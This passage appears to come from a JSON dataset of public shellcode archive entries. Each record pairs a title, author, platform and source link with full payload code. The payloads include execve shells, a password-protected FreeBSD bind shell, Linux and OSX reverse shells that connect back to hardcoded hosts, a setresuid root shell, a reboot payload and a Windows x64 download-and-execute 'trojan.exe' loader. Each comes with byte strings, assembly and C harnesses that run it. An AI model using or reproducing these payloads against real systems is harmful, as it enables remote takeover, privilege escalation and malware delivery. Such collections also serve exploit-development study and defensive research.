"\"\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x0$", "", "int main()", "", "{", "", "        printf(\"Hunter Length:  %d\\n\", (int)strlen(hunter));", "", "        (*(void  (*)()) hunter)();", "", "}"]},
{"Title": "Linux/x86 - execve() Shellcode (51 bytes)", "Author": "fl0 fl0w", "Published": ": 2009-12-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-555.php", "View": null, "code": ["/*", "*linux/x86 execve()51bytes", "* 08048080 <_start>:", "* 8048080: eb 1a jmp 804809c ", "* 08048082 :", "* 8048082: 5e pop %esi", "* 8048083: 31 c0 xor %eax,%eax", "* 8048085: 88 46 07 mov %al,0x7(%esi)", "* 8048088: 8d 1e lea (%esi),%ebx", "* 804808a: 89 5e 08 mov %ebx,0x8(%esi)", "* 804808d: 89 46 0c mov %eax,0xc(%esi)", "* 8048090: b0 0b mov $0xb,%al", "* 8048092: 89 f3 mov %esi,%ebx", "* 8048094: 8d 4e 08 lea 0x8(%esi),%ecx", "* 8048097: 8d 4e 0c lea 0xc(%esi),%ecx", "* 804809a: cd 80 int $0x80", "* 0804809c :", "* 804809c: e8 e1 ff ff ff call 8048082 ", "* 80480a1: 2f das", "* 80480a2: 62 69 6e bound %ebp,0x6e(%ecx)", "* 80480a5: 2f das", "* 80480a6: 73 68 jae 8048110 ", "* 80480a8: 4a dec %edx", "* 80480a9: 41 inc %ecx", "* 80480aa: 41 inc %ecx", "* 80480ab: 41 inc %ecx", "* 80480ac: 41 inc %ecx", "* 80480ad: 4b dec %ebx", "* 80480ae: 4b dec %ebx", "* 80480af: 4b dec %ebx", "* 80480b0: 4b dec %ebx", "*/", "#include<stdio.h>", "char shellcode[]=\"\\xeb\\x1a\\x5e\\x31\\xc0\\x88\\x46\\x07\\x8d\"", "\"\\x1e\\x89\\x5e\\x08\\x89\\x46\"", "\"\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\xe8\\xe1\"", "\"\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x4a\\x41\\x41\\x41\\x41\"", "\"\\x4b\\x4b\\x4b\\x4b\";", "main()", "{ void (*routine)();", "routine=&shellcode;", "printf(\"size of shellcode: %dbytes\\n\",sizeof(shellcode));", "routine();", "}"]},
{"Title": "FreeBSD/x64 - Bind (/TCP) Shell (/bin/sh) + Password (R2CBw0cr) Shellcode (127 bytes)", "Author": "Gitsnik", "Published": ": 2009-01-11", "Platform": "FreeBSD_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-865.php", "View": null, "code": ["/*", "* Gitsnik, @dracyrys", "* FreeBSD x86_64 bind_tcp with passcode, 127 bytes", "* Passcode: R2CBw0cr", "*/", "", "C Source:", "", "char code[] = \\", "\"\\x6a\\x61\\x58\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x99\"", "\"\\x0f\\x05\\x48\\x97\\xba\\xff\\x02\\xaa\\xaa\\x80\"", "\"\\xf2\\xff\\x52\\x48\\x89\\xe6\\x99\\x04\\x66\\x80\"", "\"\\xc2\\x10\\x0f\\x05\\x04\\x6a\\x0f\\x05\\x04\\x1e\"", "\"\\x48\\x31\\xf6\\x99\\x0f\\x05\\x48\\x97\\x6a\\x03\"", "\"\\x58\\x52\\x48\\x8d\\x74\\x24\\xf0\\x80\\xc2\\x10\"", "\"\\x0f\\x05\\x48\\xb8\\x52\\x32\\x43\\x42\\x77\\x30\"", "\"\\x63\\x72\\x57\\x48\\x8d\\x3e\\x48\\xaf\\x74\\x08\"", "\"\\x48\\x31\\xc0\\x48\\xff\\xc0\\x0f\\x05\\x5f\\x48\"", "\"\\x89\\xd0\\x48\\x89\\xfe\\x48\\xff\\xce\\xb0\\x5a\"", "\"\\x0f\\x05\\x75\\xf7\\x99\\x04\\x3b\\x48\\xbb\\x2f\"", "\"\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x52\\x53\\x54\"", "\"\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\";", "", "Assembly Intel Source:", "", "global _start", "", ";", "; Bindshell in 64 bit shellcode (written", "; and tested on a FreeBSD 9.1 AMD64 OS)", ";", "; Author: Gitsnik", "; Twitter: @dracyrys", "; Passcode: R2CBw0cr", "; 127 bytes", ";", "", "section .text", "", "_start:", ";", "; int socket( 2, 1, 0 )", ";", "; socket will return a socket into rax", ";", "; 12 bytes", ";", "push byte 0x61", "pop rax", "push byte 0x02", "pop rdi", "push byte 0x01", "pop rsi", "cdq  ; rdx is null", "syscall  ; socket( 2, 1, 0 )", "", ";", "; Swap our socket from RAX into RDI which is where", "; the next few functions want it anyway", ";", "; xchg is 1 byte shorter than mov", ";", "; 2 bytes", "xchg rdi, rax    ; socket in rdi for bind() rax is now 2", "", ";", "; bind( sockfd, *addr, addrlen )", ";", "; We need to set up our serv_addr (which we know is 0,port,2)", "; So load it all into RAX and push that. Note that because we want", "; 7 bytes but the register is 8, we pad 0xff onto the back and then", "; xor it to null to line everything up.", ";", "; 20 bytes", "", "mov edx, 0xaaaa02ff", "xor dl, 0xff", "push rdx", "mov rsi, rsp     ; rsi points to our sockaddr *", "", "cdq              ; reset RDX", "add al, 0x66     ; bind() is 0x68 but rax is already 0x02", "add dl, 0x10     ; 16 (sizeof)", "syscall", "", ";", "; listen is 0x6a", ";", "; listen( sockfd, backlog )", ";", "; bind() returns 0 on success, so add al, RDI already points at our", "; sockfd, and we don't care what's in backlog but because it's a", "; stack pointer from a few lines back the number is sufficiently high", "; that it doesn't matter.", ";", "; 4 bytes", "", "add al, 0x6a", "syscall", "", ";", "; accept( sockfd, 0, 0 )", ";", "; accept() will return a new sockfd for us.", ";", "; 8 bytes", ";", "add al, 0x1e", "xor rsi, rsi", "cdq", "syscall", "", ";", "; read( socket, buffer, length )", ";", "; Calls should read:", "; rax: syscall number (0x03 on FreeBSD)", "; rdi: client socket", "; rsi: buffer address", "; rdx: read size (0xf)", ";", "; We take the returned sockfd ( client ) from rax and load it into rdi", "; as our second argument. We set RAX to be 0x03, as this is the syscall", "; ID (reference: /usr/include/sys/syscall.h)", ";", "; Set rsi to be rsp-0xf to give us 0xf bytes of space for a buffer", "; and set dl to be our length. RDX is still null because of the cdq we", "; did earlier.", ";", "; When we are finished RAX will be the number of bytes read from the socket", "; RDI will be our client socket", "; RSI will contain the pointer to our string for passcode comparison", "; RDX will be 0x000000000000000F", ";", "; 16 bytes", "", "xchg rdi, rax", "push byte 0x03   ; 0x03 is read() in FreeBSD", "pop rax", "push rdx         ; Still null from cdq up top.", "lea rsi, [rsp-0x10]", "add dl, 0x10", "syscall", "", ";", "; rsi has our string, rdi client socket", ";", "; 18 bytes", ";", "mov rax, 0x7263307742433252 ; Replace your 8 character passcode here.", "push rdi                    ; save the socket", "lea rdi, [rsi]", "scasq", "jz dup2setup", "", ";", "; Exit", ";", "; 8 bytes", ";", "xor rax, rax", "inc rax", "syscall", "", ";", "; Setup for dup2 loop", ";", "; 7 bytes", ";", "dup2setup:", "pop rdi", "mov rax, rdx    ; RDX is dl, 0x10 but otherwise 0x00", "; so we can do this and then just correct", "; in the dup2 loop.", "mov rsi, rdi", "", ";", "; dup2 loop", ";", "; 9 bytes", "dup2:", "dec rsi", "mov al, 0x5a", "syscall", "jnz dup2", "", ";", "; Now for the big one. Let's set up our execve()", ";", "; At this point RAX is 0 so just null out rdx", ";", "; We need rdx to be null for the 3rd argument to execve()", ";", "; 23 bytes", "cdq", "", "add al, 0x3b     ; execve()", "mov rbx, 0x68732f2f6e69622f ; hs//nib/", "", "; Argument one shell[0] = \"/bin//sh\"", "push rdx     ; null", "push rbx     ; hs//nib/", "", "; We need pointers for execve()", "push rsp     ; *pointer to shell[0]", "pop rdi  ; Argument 1", "", "; Argument two shell (including address of each argument in array)", "push rdx     ; null", "push rdi     ; address of shell[0]", "", "; We need pointers for execve()", "push rsp     ; address of char * shell", "pop rsi      ; Argument 2", "", "syscall"]},
{"Title": "Linux/x86 - Bind (45295/TCP) Shell (/bin/sh) + fork() Shellcode (200 bytes)", "Author": "eSDee", "Published": ": 2009-01-01", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-553.php", "View": null, "code": ["/* linux x86 shellcode by eSDee of Netric (www.netric.org)", " * 131 byte - connect back shellcode (port=0xb0ef)", " */     ", "", "#include <stdio.h>", "", "char", "shellcode[] = ", "        \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x51\\xb1\"", "        \"\\x06\\x51\\xb1\\x01\\x51\\xb1\\x02\\x51\"", "        \"\\x89\\xe1\\xb3\\x01\\xb0\\x66\\xcd\\x80\"", "        \"\\x89\\xc2\\x31\\xc0\\x31\\xc9\\x51\\x51\"", "        \"\\x68\\x41\\x42\\x43\\x44\\x66\\x68\\xb0\"", "        \"\\xef\\xb1\\x02\\x66\\x51\\x89\\xe7\\xb3\"", "        \"\\x10\\x53\\x57\\x52\\x89\\xe1\\xb3\\x03\"", "        \"\\xb0\\x66\\xcd\\x80\\x31\\xc9\\x39\\xc1\"", "        \"\\x74\\x06\\x31\\xc0\\xb0\\x01\\xcd\\x80\"", "        \"\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\xcd\\x80\"", "        \"\\x31\\xc0\\xb0\\x3f\\x89\\xd3\\xb1\\x01\"", "        \"\\xcd\\x80\\x31\\xc0\\xb0\\x3f\\x89\\xd3\"", "        \"\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x31\\xd2\"", "        \"\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\"", "        \"\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\"", "        \"\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\"", "        \"\\x01\\xcd\\x80\";", "", "int", "c_code()", "{", "        char *argv[2];", "        char *sockaddr = \"\\x02\\x00\"             //  Address family", "                         \"\\xef\\xb0\"             //  port", "                         \"\\x00\\x00\\x00\\x00\"     //  sin_addr", "                         \"\\x00\\x00\\x00\\x00\"", "                         \"\\x00\\x00\\x00\\x00\";", "", "        int sock;", "", "        sock = socket(2, 1, 6);", "        if (connect(sock, sockaddr, 16) < 0) exit();", "", "        dup2(sock, 0);", "        dup2(sock, 1);", "        dup2(sock, 2);", "", "        argv[0] = \"//bin/sh\";", "        argv[1] = NULL;", "", "        execve(argv[0], &argv[0], NULL);", "        exit();", "}", "", "int", "asm_code()", "{", "        __asm(\" # sock = socket(2, 1, 6);", "                xorl    %eax,   %eax", "                xorl    %ebx,   %ebx", "                xorl    %ecx,   %ecx", "                pushl   %ecx", "                movb    $6,     %cl             # IPPROTO_TCP", "                pushl   %ecx", "                movb    $1,     %cl             # SOCK_STREAM", "                pushl   %ecx", "                movb    $2,     %cl             # AF_INET", "                pushl   %ecx", "                movl    %esp,   %ecx", "                movb    $1,     %bl             # SYS_SOCKET", "                movb    $102,   %al             # SYS_socketcall", "                int     $0x80", "", "                # connect(sock, sockaddr, 16)", "                movl    %eax,   %edx", "                xorl    %eax,   %eax", "                xorl    %ecx,   %ecx", "                pushl   %ecx", "                pushl   %ecx", "                pushl   $0x44434241             # ip address", "                pushw   $0xefb0                 # port", "                movb    $0x02,  %cl             # address family", "                pushw   %cx", "                movl    %esp,   %edi", "                movb    $16,    %bl             # sizeof(sockaddr)", "                pushl   %ebx", "                pushl   %edi", "                pushl   %edx                    # sock", "                movl    %esp,   %ecx", "                movb    $3,     %bl             # SYS_CONNECT", "                movb    $102,   %al             # SYS_socketcall", "                int     $0x80           ", "                xorl    %ecx,   %ecx", "                cmpl    %eax,   %ecx", "                je CONNECTED", "", "                # exit()", "                xorl    %eax,   %eax", "                movb    $1,     %al             # SYS_exit", "                int     $0x80", "", "                CONNECTED:", "                # dup2(sock, 0);", "                xorl    %eax,   %eax", "                movb    $63,    %al             # SYS_dup2", "                movl    %edx,   %ebx            # sock", "                int     $0x80", "", "                # dup2(sock, 1);", "                xorl    %eax,   %eax", "                movb    $63,    %al             # SYS_dup2", "                movl    %edx,   %ebx            # sock", "                movb    $1,     %cl             # stdout", "                int     $0x80", "", "                # dup2(sock, 2);", "                xorl    %eax,   %eax", "                movb    $63,    %al             # SYS_dup2", "                movl    %edx,   %ebx            # sock", "                movb    $2,     %cl             # stderr", "                int     $0x80", "", "                # execve(argv[0], &argv[0], NULL);", "                xorl    %eax,   %eax", "                xorl    %edx,   %edx", "                pushl   %eax", "                pushl   $0x68732f6e             # the string", "                pushl   $0x69622f2f             # //bin/sh", "                movl    %esp,   %ebx", "                pushl   %eax", "                pushl   %ebx", "                movl    %esp,   %ecx", "                movb    $11,    %al             # SYS_execve", "                int     $0x80", "", "                # exit()", "                xorl    %eax,   %eax", "                movb    $1,     %al             # SYS_exit", "                int     $0x80", "                \");", "}", "", "int", "main()", "{", "        void (*funct)();", "", "        shellcode[33] = 81;     /* ip of www.netric.org :) */", "        shellcode[34] = 17;", "        shellcode[35] = 46;", "        shellcode[36] = 156;", "", "        (long) funct = &shellcode; ", "        funct();        ", "        return 0;", "}"]},
{"Title": "OSX/PPC - Reverse (/TCP) Shell (/bin/csh) Shellcode", "Author": "H D Moore", "Published": ": 2009-01-01", "Platform": "OSX_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-122.php", "View": null, "code": [";;", ";", ";        Name: single_reverse_tcp", ";   Qualities: Can Have Nulls", ";   Platforms: MacOS X / PPC", ";     Authors: H D Moore < hdm [at] metasploit.com >", ";     Version: $Revision: 1.1 $", ";     License:", ";", ";        This file is part of the Metasploit Exploit Framework", ";        and is subject to the same licenses and copyrights as", ";        the rest of this package.", ";", "; Description:", ";", ";        Connect back and spawn a shell", ";", ";", ";;", "", ".globl _main", ".text", "_main:", "\t;; socket", "\tli      r3, 2", "    li      r4, 1", "    li      r5, 6", "    li      r0, 97", "    sc", "    xor     r0, r0, r0", "    mr      r30, r3", "", "    bl\t\t_connect", "    .long \t0x00022211", "    .long \t0x7f000001", "", "_connect:", "    mflr    r4", "    li      r5, 0x10", "    li      r0, 98", "    mr      r3, r30", "    sc", "\txor.\tr5, r5, r5", "", "_setup_dup2:", "\tli      r5, 2", "", "_dup2:", "    li      r0, 90", "    mr      r3, r30", "    mr      r4, r5", "    sc", "    xor     r0, r0, r0", "    subi    r5, r5, 1", "    cmpwi   r5, -1", "    bnel    _dup2", "", "_fork:", "    li      r0, 2", "    sc", "\txor.\tr5, r5, r5", "", "_execsh:", "    xor.    r5, r5, r5", "    bnel    _execsh", "    mflr    r3", "    addi    r3, r3, 28", "    stw     r3, -8(r1)      ; argv[0] = path", "    stw     r5, -4(r1)      ; argv[1] = NULL", "    subi    r4, r1, 8       ; r4 = {path, 0}", "    li      r0, 59", "    sc                      ; execve(path, argv, NULL)", "", "; csh removes the need for setuid()", "path:", "\t.ascii  \"/bin/csh\"", "\t.long   0x00414243"]},
{"Title": "Linux/x86 - setresuid(0,0,0) + /bin/sh Shellcode (35 bytes)", "Author": "sorrow", "Published": ": 2008-09-29", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-220.php", "View": null, "code": ["{==========================================================}", "{ linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes    }", "{==========================================================}", "", "Shellcode by the FHM crew:", "----------------------------", "http://fhm.noblogs.org", "----------------------------", "", "Contact us at:", "", "--------------------------------------------------", "sorrow: rawhazard@autistici.org; betat@hotmail.it", "--------------------------------------------------", "fhm: fhm@autistici.org;", "--------------------------------------------------", "", "", "Assembly code:", "", "--[code]--", "BITS 32", "", ";setresuid(0,0,0)", "xor eax, eax", "xor ebx, ebx", "xor ecx, ecx", "cdq", "mov BYTE al, 0xa4", "int 0x80", "", ";execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])", "push BYTE 11", "pop eax", "push ecx", "push 0x68732f2f", "push 0x6e69622f", "mov ebx, esp", "push ecx", "mov edx, esp", "push ebx", "mov ecx, esp", "int 0x80", "--[/code]--", "", "Shellcode string:", "--[code]--", "char shellcode [] =", "\"\\x80\\xcd\\xe1\\x89\\x53\\xe2\\x89\\x51\\xe3\\x89\\x6e\\x69\\x62\\x2f\\x68\\x68\\x73\\x2f\\x2f", "                    ", "\\x68\\x51\\x58\\x0b\\x6a\\x80\\xcd\\xa4\\xb0\\x99\\xc9\\x31\\xdb\\x31\\xc0\\x31\"", "-[/code]-", "", "# milw0rm.com [2008-09-29]"]},
{"Title": "Windows/x64 - URLDownloadToFileA(http://localhost/trojan.exe) + Execute Shellcode (218+ bytes)", "Author": "Weiss", "Published": ": 2006-08-07", "Platform": "Windows_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-150.php", "View": null, "code": [";", "; dexec64.asm - 218+ bytes (unoptimised)", ";", "; Win64 asm code, download & execute file using URLDownloadToFileA moniker & WinExec", ";", "; tested on AMD64 running Windows x64 SP1", ";", "; there probably are errors in the code, but this is more of an experimental source if nothing else.", "; send corrections or errors to: 'weiss' wyse101 [at] gmail [dot] com", "; code is not optimised at all, doesn't contain null bytes, so is possibly suitable for testing exploits on win64", ";", "; one of the main stumbling blocks in coding x64 asm on windows is the alignment of the stack.", "; it must be aligned by 16 bytes because windows uses 128-bit SSE2, otherwise the api call will fail.", ";", "; thanx:", ";", "; roy g biv/29a - http://www.29a.net/", "; Feryno - http://feryno.host.sk", "; Tomasz Grysztar - http://flatassembler.org", ";", "format PE64 console 4.0", "entry entrypoint", "", "section '.text' code readable writeable executable     ; assumed to be writeable when in memory, no NX obstruction!", "", "                                           ; 1*8 is used rather than 0*8 because it uses null byte", "LoadLibraryA         equ  rbp+1*8          ; using rbp is smaller than using ebp on 64-bit", "WinExec              equ  rbp+2*8", "URLDownloadToFileA   equ  rbp+3*8          ; must be rbp because of 64-bit URLMON base address", "", "entrypoint:", "   jmp get_eip", "load_dta:", "   pop  rax", "   push rax", "   lea  r15,[rax-(setup_stack-hashes)]", "   inc  byte [rax-(setup_stack-url_end)]          ; nullify tail end of url", "   inc  byte [rax-(setup_stack-fname_end)]        ; nullify end of filename", "   inc  byte [rax-(setup_stack-url_mon_end)]      ; nullify end of URLMON", "   ret                                            ; go!", "", "hashes:", "   dw  0bb86h         ; LoadLibraryA()     635bbb86", "   dw  0a333h         ; WinExec()          208da333", "", "   db  'URLMON',0ffh,0ffh", "url_mon_end   =   $-2", "", "   dw  05f92h         ; URLDownloadToFileA    c91e5f92", "   dq  -1", "fname:", "   db  'trojan.exe',0ffh                        ; what to save as", "fname_end  =   $-1", "", "url:", "   db  'http://localhost/trojan.exe',0ffh       ; where to download file from", "url_end  =   $-1", "", "get_eip:", "   call  load_dta", "setup_stack:", "   add  rsp,-(4*8)    ; 3 api variables, + 1 for avoiding null :-|", "   push  rsp", "   pop  rbp           ; rbp = table of api", "   mov  rdi,rbp       ; rdi points to table also", "   stosq              ; doesn't really do anything.", "   add  rsp,-(11*8)   ; reserve space for windows, when calling api", "", "   push 60h           ; Hello, Ratter. 8-D", "   pop rcx", "   mov rax,[gs:rcx]   ; Peb", "   mov rax,[rax+18h]  ; PebLdr", "   mov rsi,[rax+30h]  ; Ldr.InInitializationOrderModuleList", "   lodsq              ; skip ntdll.dll", "   mov rbx,[rax+10h]  ; kernel32.dll base", "", "   mov cl,2                     ; get 2 api first", "get_apis_loop:", "   mov  eax,dword[rbx+3ch]      ; MZ header size", "   lea  rsi,[rbx+rax+78h]       ; export directory begins at 88h", "   mov  eax,dword[rsi+10h]      ; extra instructions needed to avoid null bytes", "   lea  rsi,[rbx+rax+1ch]", "", "   lodsd", "   lea  r9,[rax+rbx]", "   lodsd", "   lea  r10,[rax+rbx]", "   lodsd", "   lea  r11,[rax+rbx]", "   xor  r12,r12", "load_index:", "   mov  esi,dword[r10+4*r12]", "   add  rsi,rbx", "   inc  r12", "   xor  eax,eax", "   cdq", "hash_export:", "   lodsb", "   add  edx,eax", "   rol  edx, 5", "   dec  eax", "   jns  hash_export", "   ror  edx, 5", "   cmp  dx,word [r15]            ; found api?", "   jne  load_index", "", "   movzx  edx,word [r11+2*r12-2]", "   mov  eax,[r9+4*rdx]", "   add  rax,rbx", "   add  r15,2                  ; skip hash", "", "   stosq                       ; save api address", "   loop get_apis_loop", "", "   push  r15                   ; push/pop to avoid null with mov", "   pop  rcx", "   call  qword[LoadLibraryA]", "", "   xchg  rax,rbx", "   add  r15,8                   ; skip URLMON, first time.", "   push  1                      ; get 1 api from URLMON", "   pop  rcx", "   test  rbx,rbx                ; continue if not zero", "   jne   get_apis_loop", "", "   dec  ecx", "   push  rbx", "   sub  rsp,3*8                 ; needed to align stack", "   xor  r9,r9", "   mov  r8,r15", "   lea  rdx,[r8+(url-fname)]", "   call  qword[URLDownloadToFileA]", "", "   push 1", "   pop  rdx", "   mov rcx,r15", "   call  qword[WinExec]       ; WinExec(\"trojan.exe\",SW_SHOWNORMAL??);", "", "   ;jmp   $                   ; hang", "", "   call qword[ExitProcess]    ; not required, testing only", "", "; section below not required, simply for testing.", "section '.idata' import data readable writeable", "", "  dd 0,0,0,RVA kernel_name,RVA kernel_table", "  dd 0,0,0,0,0", "", "  kernel_table:", "    ExitProcess dq RVA _ExitProcess", "    dq 0", "", "  kernel_name db 'KERNEL32.DLL',0", "", "  _ExitProcess dw 0", "    db 'ExitProcess',0", "", "; July 2006 - (Ireland)", "", "; milw0rm.com [2006-08-07]"]},
{"Title": "Linux/x86 - Reverse (127.0.0.1:31337/TCP) Shell Shellcode (74 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13393.c", "View": "https://old.exploit-db.com/raw/13393/", "code": ["/*", " * (linux/x86) connect-back shellcode, 127.0.0.1:31337/tcp - 74 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x66\"              // push $0x66 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\x99\"                  // cltd ", "\t\"\\x6a\\x01\"              // push $0x1 ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x6a\\x02\"              // push $0x2 ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x5d\"                  // pop %ebp ", "\t\"\\xbe\\x80\\xff\\xff\\xfe\"  // mov $0xfeffff80,%esi (0xxfeffff80 = ~127.0.0.1)", "\t\"\\xf7\\xd6\"              // not %esi ", "\t\"\\x56\"                  // push %esi ", "\t\"\\x66\\xbd\\x69\\x7a\"      // mov $0x7a69,%bp (0x7a69 = 31337)", "\t\"\\x0f\\xcd\"              // bswap %ebp ", "\t\"\\x09\\xdd\"              // or %ebx,%ebp ", "\t\"\\x55\"                  // push %ebp ", "\t\"\\x43\"                  // inc %ebx ", "\t\"\\x6a\\x10\"              // push $0x10 ", "\t\"\\x51\"                  // push %ecx ", "\t\"\\x50\"                  // push %eax ", "\t\"\\xb0\\x66\"              // mov $0x66,%al ", "", "\t//", "\t// <_doint>:", "\t//", "", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x87\\xd9\"              // xchg %ebx,%ecx ", "\t\"\\x5b\"                  // pop %ebx ", "\t", "\t//", "\t// <_dup2loop>:", "\t//", "", "\t\"\\xb0\\x3f\"              // mov $0x3f,%al ", "\t\"\\xcd\\x80\"              // int $0x80 ", "\t\"\\x49\"                  // dec %ecx ", "\t\"\\x79\\xf9\"              // jns <_dup2loop> ", "\t\"\\xb0\\x0b\"              // mov $0xb,%al ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x2f\\x73\\x68\"  // push $0x68732f2f ", "\t\"\\x68\\x2f\\x62\\x69\\x6e\"  // push $0x6e69622f ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\xeb\\xdf\";             // jmp <_doint> ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - Normal Exit With Random (So To Speak) Return Value Shellcode (5 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13394.c", "View": "https://old.exploit-db.com/raw/13394/", "code": ["/*", " * (linux/x86) normal exit w/ random (so to speak) return value - 5 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x31\\xc0\"              // xor %eax,%eax ", "\t\"\\x40\"                  // inc %eax ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - getppid() + execve(/proc/pid/exe) Shellcode (51 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13395.c", "View": "https://old.exploit-db.com/raw/13395/", "code": ["/*", " * (linux/x86) getppid() + execve(\"/proc/<pid>/exe\", [\"/proc/<pid>/exe\", NULL]) - 51 bytes", " * - izik <izik@tty64.org> ", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x40\"              // push $0x40 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\xcd\\x80\"              // int $0x80 ", "", "\t//", "\t// <_convert>:", "\t//", "", "\t\"\\x4c\"                  // dec %esp ", "\t\"\\x99\"                  // cltd ", "\t\"\\x6a\\x0a\"              // push $0xa ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\xf7\\xf3\"              // div %ebx ", "\t\"\\x80\\xc2\\x30\"          // add $0x30,%dl ", "\t\"\\x88\\x14\\x24\"          // mov %dl,(%esp) ", "\t\"\\x85\\xc0\"              // test %eax,%eax ", "\t\"\\x75\\xef\"              // jnz _convert", "\t\"\\x99\"                  // cltd ", "\t\"\\x5b\"                  // pop %ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x68\\x2f\\x65\\x78\\x65\"  // push $0x6578652f ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x68\\x72\\x6f\\x63\\x2f\"  // push $0x2f636f72 ", "\t\"\\x68\\x2f\\x2f\\x2f\\x70\"  // push $0x702f2f2f ", "\t\"\\xb0\\x0b\"              // mov $0xb,%al ", "\t\"\\x89\\xe3\"              // mov %esp,%ebx ", "\t\"\\x52\"                  // push %edx ", "\t\"\\x53\"                  // push %ebx ", "\t\"\\x89\\xe1\"              // mov %esp,%ecx ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - (eax != 0 and edx == 0) + exit() Shellcode (4 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-233.php", "View": null, "code": ["/*", " * (linux/x86) quick (yet conditional, eax != 0 and edx == 0) exit - 4 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\xf7\\xf0\"              // div %eax ", "\t\"\\xcd\\x80\";             // int $0x80", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
{"Title": "Linux/x86 - reboot() Shellcode (20 bytes)", "Author": "izik", "Published": ": 2006-01-21", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13397.c", "View": "https://old.exploit-db.com/raw/13397/", "code": ["/*", " * (linux/x86) reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2, LINUX_REBOOT_CMD_RESTART) - 20 bytes", " * - izik <izik@tty64.org>", " */", "", "char shellcode[] = ", "", "\t\"\\x6a\\x58\"              // push $0x58 ", "\t\"\\x58\"                  // pop %eax ", "\t\"\\xbb\\xad\\xde\\xe1\\xfe\"  // mov $0xfee1dead,%ebx ", "\t\"\\xb9\\x69\\x19\\x12\\x28\"  // mov $0x28121969,%ecx ", "\t\"\\xba\\x67\\x45\\x23\\x01\"  // mov $0x1234567,%edx ", "\t\"\\xcd\\x80\";             // int $0x80 ", "", "int main(int argc, char **argv) {", "\tint *ret;", "\tret = (int *)&ret + 2;", "\t(*ret) = (int) shellcode;", "}", "", "// milw0rm.com [2006-01-21]"]},
